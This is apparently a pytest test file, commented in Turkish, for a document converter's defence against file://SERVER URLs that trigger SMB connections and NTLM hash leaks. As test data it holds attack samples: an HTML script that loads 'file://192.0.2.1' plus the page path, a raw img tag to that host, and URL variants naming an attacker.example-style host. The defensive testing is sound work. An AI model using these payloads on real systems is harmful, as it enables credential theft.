"""Güvenlik adım 3: HTML / Markdown baskısında `file://SUNUCU/...` (GUVENLIK_PLANI.md).

Kanıt: belgedeki betik `file://192.0.2.1` + `location.pathname` adresini istedi; izin denetimi
yalnızca yola baktığı için bunu "belgenin kendisi" sayıp geçirdi, Windows da 192.0.2.1:445'e SMB
bağlantısı açmaya çalıştı (SYN_SENT, System). Gerçek saldırıda bu, saldırganın sunucusu olur:
NTLM özeti sızar, "dosyalar internete çıkmaz" vaadi bozulur.

192.0.2.1 RFC 5737 belgeleme adresidir; internette yönlendirilmez.
"""

from __future__ import annotations

import threading
import time
from pathlib import Path

import psutil
import pytest
from PIL import Image

from toolia import engines
from toolia.convert import browser as br
from toolia.settings import Settings

BROWSER = engines.detect_browser(Settings()).path
needs_browser = pytest.mark.skipif(not BROWSER, reason="Edge/Chrome yok")
IP = "192.0.2.1"


@pytest.mark.parametrize("url", [
    f"file://{IP}/C:/Users/x/belge.html",
    "file://saldirgan.example/C:/belge.html",
    "file://%31%39%32.0.2.1/C:/belge.html",
    f"file://{IP}:445/C:/belge.html",
    "file://user@host/C:/belge.html",
])
def test_remote_file_urls_have_no_local_path(url):
    assert br.file_url_path(url) is None
    assert br.is_remote_file_url(url)


@pytest.mark.parametrize("url", ["file:///C:/Users/x/a.png", "file://localhost/C:/Users/x/a.png",
                                 "file://LOCALHOST/C:/Users/x/a.png"])
def test_local_file_urls_still_resolve(url):
    path = br.file_url_path(url)
    assert path is not None and path.name == "a.png"
    assert not br.is_remote_file_url(url)


class _Req:
    def __init__(self, url: str) -> None:
        self.url = url


class _Route:
    def __init__(self, url: str) -> None:
        self.request = _Req(url)
        self.result = None

    def continue_(self):
        self.result = "devam"

    def abort(self):
        self.result = "engel"


class _Page:
    def route(self, pattern, fn):
        self.fn = fn


class _Ctx:
    def new_page(self):
        self.page = _Page()
        return self.page


class _Browser:
    def new_context(self, **kw):
        self.ctx = _Ctx()
        return self.ctx


def _decide(url: str, allowed: Path) -> tuple[str, list[str]]:
    b, blocked = _Browser(), []
    page = br.new_offline_page(b, lambda p: p == allowed.resolve(), blocked)
    r = _Route(url)
    page.fn(r)
    return r.result, blocked


def test_route_blocks_own_path_behind_a_server_name(tmp_path):
    doc = tmp_path / "belge.html"
    doc.write_text("x", encoding="utf-8")
    own = doc.resolve().as_uri()  # file:///C:/...
    assert _decide(own, doc) == ("devam", [])
    sneaky = own.replace("file:///", f"file://{IP}/")
    assert _decide(sneaky, doc) == ("engel", [sneaky])
    warn = br.blocked_warnings([sneaky])
    assert warn == [f"Başka bir bilgisayardaki dosya güvenlik için açılmadı: {sneaky}"]


class _SmbWatch:
    """Baskı sürerken 192.0.2.1'e açılan bağlantıları toplar."""

    def __init__(self) -> None:
        self.seen: set = set()
        self._stop = threading.Event()
        self._t = threading.Thread(target=self._run, daemon=True)

    def _run(self) -> None:
        while not self._stop.is_set():
            for c in psutil.net_connections(kind="inet"):
                if c.raddr and c.raddr.ip == IP:
                    self.seen.add((c.raddr.port, c.status, c.pid))
            time.sleep(0.2)

    def __enter__(self):
        self._t.start()
        return self

    def __exit__(self, *exc):
        time.sleep(2)  # SYN birkaç saniye görünür kalır
        self._stop.set()
        self._t.join()


@needs_browser
def test_html_script_cannot_open_smb_connection(tmp_path):
    from toolia.convert.html import print_html

    src = tmp_path / "belge.html"
    src.write_text(f"""<!doctype html><meta charset="utf-8"><body><p>deneme</p><script>
      const i = new Image(); i.src = 'file://{IP}' + location.pathname;
      document.body.appendChild(i);</script></body>""", encoding="utf-8")
    with _SmbWatch() as watch:
        res = print_html(src, tmp_path / "belge.pdf", browser_path=BROWSER, confine=True)
    assert watch.seen == set()
    assert any("Başka bir bilgisayardaki dosya" in w for w in res.warnings), res.warnings


@needs_browser
def test_markdown_raw_html_cannot_open_smb_connection(tmp_path):
    """Notta betik çalışmaz, ama ham HTML ile notun bilinen bir resminin yolu sunucu adının
    arkasına yazılabilir (resim izin listesinde olduğu için yalnızca yol denetimi geçirirdi)."""
    from toolia.convert.markdown.render import MarkdownPrinter

    img = tmp_path / "a.png"
    Image.new("RGB", (8, 8), "red").save(img)
    sneaky = img.resolve().as_uri().replace("file:///", f"file://{IP}/")
    note = tmp_path / "not.md"
    note.write_text(f'# Not\n\n![](a.png)\n\n<img src="{sneaky}">\n', encoding="utf-8")
    with _SmbWatch() as watch, MarkdownPrinter(BROWSER, confine=True) as printer:
        res = printer.convert(note, tmp_path / "not.pdf")
    assert watch.seen == set()
    assert any("Başka bir bilgisayardaki dosya" in w for w in res.warnings), res.warnings
